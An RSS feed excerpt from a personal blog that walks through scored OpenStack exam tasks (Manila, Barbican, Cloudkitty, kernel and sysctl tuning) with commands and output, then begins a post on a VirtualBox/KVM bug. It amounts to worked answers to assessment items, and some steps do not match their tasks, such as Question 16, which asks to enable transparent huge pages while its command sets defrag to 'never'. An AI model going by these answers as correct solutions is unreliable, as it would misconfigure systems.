</span></span><span class="line"><span class="cl">sdb                                               8:16   0   20G  0 disk 
</span></span><span class="line"><span class="cl">├─sdb1                                            8:17   0   10G  0 part 
</span></span><span class="line"><span class="cl">│ ├─cinder--volumes-cinder--volumes--pool_tmeta 253:2    0   12M  0 lvm  
</span></span><span class="line"><span class="cl">│ │ └─cinder--volumes-cinder--volumes--pool     253:4    0  9.5G  0 lvm  
</span></span><span class="line"><span class="cl">│ └─cinder--volumes-cinder--volumes--pool_tdata 253:3    0  9.5G  0 lvm  
</span></span><span class="line"><span class="cl">│   └─cinder--volumes-cinder--volumes--pool     253:4    0  9.5G  0 lvm  
</span></span><span class="line"><span class="cl">└─sdb2                                            8:18   0   10G  0 part /swift/node/sdb2
</span></span><span class="line"><span class="cl">sdc                                               8:32   0    3G  0 disk 
</span></span><span class="line"><span class="cl">sr0                                              11:0    1 1024M  0 rom  
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# vgdisplay
</span></span><span class="line"><span class="cl">  --- Volume group ---
</span></span><span class="line"><span class="cl">  VG Name               cinder-volumes
</span></span><span class="line"><span class="cl">  System ID             
</span></span><span class="line"><span class="cl">  Format                lvm2
</span></span><span class="line"><span class="cl">  Metadata Areas        1
</span></span><span class="line"><span class="cl">  Metadata Sequence No  4
</span></span><span class="line"><span class="cl">  VG Access             read/write
</span></span><span class="line"><span class="cl">  VG Status             resizable
</span></span><span class="line"><span class="cl">  MAX LV                0
</span></span><span class="line"><span class="cl">  Cur LV                1
</span></span><span class="line"><span class="cl">  Open LV               0
</span></span><span class="line"><span class="cl">  Max PV                0
</span></span><span class="line"><span class="cl">  Cur PV                1
</span></span><span class="line"><span class="cl">  Act PV                1
</span></span><span class="line"><span class="cl">  VG Size               &lt;10.00 GiB
</span></span><span class="line"><span class="cl">  PE Size               4.00 MiB
</span></span><span class="line"><span class="cl">  Total PE              2559
</span></span><span class="line"><span class="cl">  Alloc PE / Size       2438 / 9.52 GiB
</span></span><span class="line"><span class="cl">  Free  PE / Size       121 / 484.00 MiB
</span></span><span class="line"><span class="cl">  VG UUID               QHk53K-Kj2O-ilc2-pxk6-Upqe-meRE-vfJu6P
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">  --- Volume group ---
</span></span><span class="line"><span class="cl">  VG Name               centos
</span></span><span class="line"><span class="cl">  System ID             
</span></span><span class="line"><span class="cl">  Format                lvm2
</span></span><span class="line"><span class="cl">  Metadata Areas        1
</span></span><span class="line"><span class="cl">  Metadata Sequence No  3
</span></span><span class="line"><span class="cl">  VG Access             read/write
</span></span><span class="line"><span class="cl">  VG Status             resizable
</span></span><span class="line"><span class="cl">  MAX LV                0
</span></span><span class="line"><span class="cl">  Cur LV                2
</span></span><span class="line"><span class="cl">  Open LV               2
</span></span><span class="line"><span class="cl">  Max PV                0
</span></span><span class="line"><span class="cl">  Cur PV                1
</span></span><span class="line"><span class="cl">  Act PV                1
</span></span><span class="line"><span class="cl">  VG Size               &lt;49.00 GiB
</span></span><span class="line"><span class="cl">  PE Size               4.00 MiB
</span></span><span class="line"><span class="cl">  Total PE              12543
</span></span><span class="line"><span class="cl">  Alloc PE / Size       12542 / 48.99 GiB
</span></span><span class="line"><span class="cl">  Free  PE / Size       1 / 4.00 MiB
</span></span><span class="line"><span class="cl">  VG UUID               2tEud0-Ydx6-cFfX-dZMM-F9IC-l3nc-sLS38v
</span></span><span class="line"><span class="cl">   
</span></span></code></pre></td></tr></table>
</div>
</div><p>Well, it&rsquo;s finished.</p>
<blockquote>
<h4 id="question-13-installation-and-usage-of-manila-service-05-point"><strong>[Question 13] Installation and Usage of Manila Service [0.5 point]</strong></h4>
<p>Install the Manila service on the control and compute nodes using the <code>iaas-install-manila-controller.sh</code> and <code>iaas-install-manila-compute.sh</code> scripts, respectively. After installing the service, create a default_share_type share type (without driver support), and then create a shared storage called share01 with a size of 2G and grant permission for OpenStack management network segment to access the share01 directory. Finally, submit the username, password, and IP address of the control node to the answer box.</p>
</blockquote>
<p>Create a partion for Manila:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# fdisk /dev/sdc
</span></span><span class="line"><span class="cl">Welcome to fdisk (util-linux 2.23.2).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Changes will remain in memory only, until you decide to write them.
</span></span><span class="line"><span class="cl">Be careful before using the write command.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Device does not contain a recognized partition table
</span></span><span class="line"><span class="cl">Building a new DOS disklabel with disk identifier 0x6e07efc2.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Command (m for help): n
</span></span><span class="line"><span class="cl">Partition type:
</span></span><span class="line"><span class="cl">   p   primary (0 primary, 0 extended, 4 free)
</span></span><span class="line"><span class="cl">   e   extended
</span></span><span class="line"><span class="cl">Select (default p): p
</span></span><span class="line"><span class="cl">Partition number (1-4, default 1): 
</span></span><span class="line"><span class="cl">First sector (2048-6291455, default 2048): 
</span></span><span class="line"><span class="cl">Using default value 2048
</span></span><span class="line"><span class="cl">Last sector, +sectors or +size{K,M,G} (2048-6291455, default 6291455): 
</span></span><span class="line"><span class="cl">Using default value 6291455
</span></span><span class="line"><span class="cl">Partition 1 of type Linux and of size 3 GiB is set
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Command (m for help): w
</span></span><span class="line"><span class="cl">The partition table has been altered!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Calling ioctl() to re-read partition table.
</span></span><span class="line"><span class="cl">Syncing disks.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Installl the Manila Service in controller node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-manila-controller.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Install the Manila Service in compute node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# ./iaas-install-manila-compute.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create a default_share_type share type (without driver support):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# manila type-create default_share_type False
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check the manila type list:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# manila type-list
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create a shared storage called share01 with a size of 2G</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# manila create NFS 2 --name share01
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check if the operation succeed:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# manila list
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+--------------------------------------+---------+------+-------------+-----------+-----------+--------------------+-----------------------------+-------------------+
</span></span><span class="line"><span class="cl">| ID                                   | Name    | Size | Share Proto | Status    | Is Public | Share Type Name    | Host                        | Availability Zone |
</span></span><span class="line"><span class="cl">+--------------------------------------+---------+------+-------------+-----------+-----------+--------------------+-----------------------------+-------------------+
</span></span><span class="line"><span class="cl">| 0cdd5acb-5e54-4cdd-9187-467e2800d212 | share01 | 2    | NFS         | available | False     | default_share_type | compute@lvm#lvm-single-pool | nova              |
</span></span><span class="line"><span class="cl">+--------------------------------------+---------+------+-------------+-----------+-----------+--------------------+-----------------------------+-------------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Grant permission for OpenStack management network segment to access the share01 directory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# manila access-allow share01 ip 192.168.56.0/24 --access-level rw
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check if the operation succeed!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# manila access-list share01
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+--------------------------------------+-------------+-----------------+--------------+--------+------------+----------------------------+------------+
</span></span><span class="line"><span class="cl">| id                                   | access_type | access_to       | access_level | state  | access_key | created_at                 | updated_at |
</span></span><span class="line"><span class="cl">+--------------------------------------+-------------+-----------------+--------------+--------+------------+----------------------------+------------+
</span></span><span class="line"><span class="cl">| cad9f433-6ad3-4db9-afe1-90dc52374a08 | ip          | 192.168.56.0/24 | rw           | active | None       | 2023-05-06T06:55:13.000000 | None       |
</span></span><span class="line"><span class="cl">+--------------------------------------+-------------+-----------------+--------------+--------+------------+----------------------------+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Done!</p>
<blockquote>
<h4 id="question-14-barbican-service-installation-and-usage-05-points"><strong>[Question 14] Barbican Service Installation and Usage [0.5 points]</strong></h4>
<p>Install the Barbican service using the <code>iaas-install-barbican.sh</code> script. After the installation is complete, use the openstack command to create a key named &ldquo;secret01&rdquo;. Once created, submit the username, password, and IP address of the control node in the answer box.</p>
</blockquote>
<p>Well, it&rsquo;s easy, run <code>iaas-install-barbican.sh</code> in controller node.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-barbican.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create a key named &ldquo;secret01&rdquo;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# openstack secret store --name secret01 --payload secretkey
</span></span></code></pre></td></tr></table>
</div>
</div><p>Done!</p>
<blockquote>
<h4 id="question-15-cloudkitty-service-installation-and-usage-05-points"><strong>[Question 15] Cloudkitty Service Installation and Usage [0.5 points]</strong></h4>
<p>Install the cloudkitty service using the <code>iaas-install-cloudkitty.sh</code> script. After installation, enable the hashmap rating module and then create the volume_thresholds group. Create a service matching rule for volume.size and set the price per GB to 0.01. Next, apply discounts to corresponding large amounts of data. Create a threshold in the volume_thresholds group and set a discount of 2% (0.98) if the threshold is exceeded for volumes over 50GB. After completing the setup, submit the username, password, and IP address of the control node in the answer box.</p>
</blockquote>
<p>Run the script to install the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-cloudkitty.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Enable hashmap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@controller bin]# openstack rating module enable hashmap 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create hashmap service</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# openstack rating  hashmap service create volume.size 
</span></span><span class="line"><span class="cl">+-------------+--------------------------------------+
</span></span><span class="line"><span class="cl">| Name        | Service ID                           |
</span></span><span class="line"><span class="cl">+-------------+--------------------------------------+
</span></span><span class="line"><span class="cl">| volume.size | 12b61017-6842-4d54-aa44-599d121e5f46 |
</span></span><span class="line"><span class="cl">+-------------+--------------------------------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create hashmap service group</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# openstack rating hashmap group create  volume_thresholds 
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------+
</span></span><span class="line"><span class="cl">| Name              | Group ID                             |
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------+
</span></span><span class="line"><span class="cl">| volume_thresholds | c46c8a1e-1878-4c44-bf36-57c06ce0672b |
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create volume price</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# openstack rating hashmap mapping create -s 12b61017-6842-4d54-aa44-599d121e5f46 -g c46c8a1e-1878-4c44-bf36-57c06ce0672b  -t flat  0.01  
</span></span><span class="line"><span class="cl">+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+
</span></span><span class="line"><span class="cl">| Mapping ID                           | Value | Cost       | Type | Field ID | Service ID                           | Group ID                             | Project ID |
</span></span><span class="line"><span class="cl">+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+
</span></span><span class="line"><span class="cl">| e5f99784-e49c-47ac-98e0-6f818c3ff6fb | None  | 0.01000000 | flat | None     | 12b61017-6842-4d54-aa44-599d121e5f46 | c46c8a1e-1878-4c44-bf36-57c06ce0672b | None       |
</span></span><span class="line"><span class="cl">+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create service rule</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# openstack rating hashmap threshold create -s 12b61017-6842-4d54-aa44-599d121e5f46  -g c46c8a1e-1878-4c44-bf36-57c06ce0672b  -t rate 50 0.98
</span></span><span class="line"><span class="cl">+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+
</span></span><span class="line"><span class="cl">| Threshold ID                         | Level       | Cost       | Type | Field ID | Service ID                           | Group ID                             | Project ID |
</span></span><span class="line"><span class="cl">+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+
</span></span><span class="line"><span class="cl">| a88e4768-defd-4c72-91f2-521b28e3c1a2 | 50.00000000 | 0.98000000 | rate | None     | 12b61017-6842-4d54-aa44-599d121e5f46 | c46c8a1e-1878-4c44-bf36-57c06ce0672b | None       |
</span></span><span class="line"><span class="cl">+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Done!</p>
<blockquote>
<h4 id="question-16-openstack-platform-memory-optimization-05-points"><strong>[Question 16] OpenStack Platform Memory Optimization [0.5 points]</strong></h4>
<p>After setting up the OpenStack platform, disable memory sharing in the system and enable transparent huge pages. After completing this, submit the username, password, and IP address of the control node to the answer box.</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# find / -name defrag
</span></span></code></pre></td></tr></table>
</div>
</div><p>Disable memory sharing in the system and enable transparent huge pages.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check the fianl result:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# cat /sys/kernel/mm/transparent_hugepage/defrag 
</span></span><span class="line"><span class="cl">always madvise [never]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Done!</p>
<blockquote>
<h4 id="question-17-modify-file-handle-count-05-points"><strong>Question 17] Modify file handle count [0.5 points]</strong></h4>
<p>In a Linux server with high concurrency, it is often necessary to tune the Linux parameters in advance. By default, Linux only allows a maximum of 1024 file handles. When your server reaches its limit during high concurrency, you will encounter the error message &ldquo;too many open files&rdquo;. To address this, create a cloud instance and modify the relevant configuration to permanently increase the maximum file handle count to 65535 for the control node. After completing the configuration, submit the username, password, and IP address of the controller node to the answer box.</p>
</blockquote>
<p>Get the information of the maximum file handles:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# ulimit -n
</span></span><span class="line"><span class="cl">1024
</span></span></code></pre></td></tr></table>
</div>
</div><p>Change the settings:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# echo &#34;* soft nofile 65535&#34; &gt;&gt; /etc/security/limits.conf
</span></span><span class="line"><span class="cl">[root@controller ~]# echo &#34;* hard nofile 65535&#34; &gt;&gt; /etc/security/limits.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally just reconnect to the ssh shell, and get the maximum file handles again.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# ulimit -n
</span></span><span class="line"><span class="cl">65535
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<h4 id="question-18-linux-system-tuning---dirty-data-writing-back-10-point"><strong>[Question 18] Linux System Tuning - Dirty Data Writing Back [1.0 point]</strong></h4>
<p>There may be dirty data in the memory of a Linux system, and the system generally defaults to writing back to the disk after 30 seconds of dirty data. Modify the system configuration file to temporarily adjust the time for writing back to the disk to 60 seconds. After completion, submit the username, password, and IP address of the controller node to the answer box.</p>
</blockquote>
<p>Just edit the file <code>/etc/sysctl.conf</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# vim /etc/sysctl.conf 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Add this property into it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vm.dirty_writeback_centisecs = 6000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then execute:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# sysctl -p
</span></span></code></pre></td></tr></table>
</div>
</div><p>Verify:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# cat /proc/sys/vm/dirty_writeback_centisecs
</span></span><span class="line"><span class="cl">6000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Done!</p>
<blockquote>
<h4 id="question-19-linux-system-tuning---preventing-syn-attacks-05-points"><strong>[Question 19] Linux System Tuning - Preventing SYN Attacks [0.5 points]</strong></h4>
<p>Modify the relevant configuration files on the controller node to enable SYN cookies and prevent SYN flood attacks. After completion, submit the username, password, and IP address of the controller node to the answer box.</p>
</blockquote>
<p>Edit the file <code>/etc/sysctl.conf</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# vim /etc/sysctl.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>Add these properties into it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net.ipv4.tcp_max_syn_backlog=2048
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">net.ipv4.tcp_syncookies=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">net.ipv4.tcp_syn_retries = 0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then execute:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# sysctl -p
</span></span></code></pre></td></tr></table>
</div>
</div><p>Done!</p>
<h2 id="conclusion">Conclusion</h2>
<p>Well, finally, I finished all the steps of establishing the OpenStack!</p>
<p>These are the notes of the process.</p>
]]></description>
</item><item>
    <title>Attempt to Solve the Problem of VirtualBox Stuck on &#39;Starting&#39; When Starting a Virtual Machine</title>
    <link>http://weepingdogel.github.io/posts/problem_of_virtualbox_appeding_starting_vm/</link>
    <pubDate>Mon, 06 Mar 2023 22:27:08 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/problem_of_virtualbox_appeding_starting_vm/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/photo_2023-03-06_20-52-14.jpg" referrerpolicy="no-referrer">
            </div><h1 id="prologue-what-was-the-problem">Prologue: What was the problem?</h1>
<p>Today, I felt like playing around with VirtualBox and discovered that every virtual machine was stuck at <code>Starting virtual machine.</code>.</p>
<p>The first step when encountering a problem is to go to Google.</p>
<p>Hmm&hellip; I found two posts on the official Arch forum.</p>
<ul>
<li>
<p><a href="https://bbs.archlinux.org/viewtopic.php?id=277409" target="_blank" rel="noopener noreffer">Virtualbox hangs on Starting virtual machine window / Newbie Corner / Arch Linux Forums</a></p>
</li>
<li>
<p><a href="https://bbs.archlinux.org/viewtopic.php?id=276699" target="_blank" rel="noopener noreffer">KVM busted in linux 5.18 due to Intel CET / Kernel &amp; Hardware / Arch Linux Forums</a></p>
</li>
</ul>
<p>After reading the two posts, I discovered that it was due to a bug in KVM in the new version of the kernel.</p>
<p>Fortunately, a skilled individual had already submitted a bug report.</p>
<ul>
<li>
<p><a href="https://bugs.archlinux.org/task/75481" target="_blank" rel="noopener noreffer">FS#75481 : [linux] VBox virtual machines stop functioning</a></p>
</li>
<li>
<p><a href="https://github.com/torvalds/linux/commit/991625f3dd2cbc4b787deb0213e2bcf8fa264b21" target="_blank" rel="noopener noreffer">x86/ibt: Add IBT feature, MSR and #CP handling · torvalds/linux@991625f · GitHub</a></p>
</li>
</ul>
<p><del>As for how this bug came about&hellip; I&rsquo;m not sure, I&rsquo;m not that knowledgeable.</del></p>
<h1 id="thinking-about-how-to-solve-it">Thinking about how to solve it</h1>
